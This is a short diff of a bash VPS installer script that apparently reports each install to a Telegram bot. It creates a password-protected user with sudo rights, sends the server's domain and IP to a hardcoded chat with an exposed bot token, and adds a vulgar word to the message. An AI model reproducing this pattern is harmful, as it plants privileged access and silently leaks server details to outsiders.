@@ -171,11 +171,11 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="2030911878"
+CHATID="-1002030911878"
 KEY="6414883775:AAG-XwXGSYqHpCoDMJbCZxLc3n-GYK0XN-o"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script v6 By Raden Rizki 
+TEXT="Installasi script v6 By Raden Rizki Kontol 
 ============================
 <code>Domain     :</code> <code>$domain</code>
 <code>IP Vps     :</code> <code>$IPVPS</code>
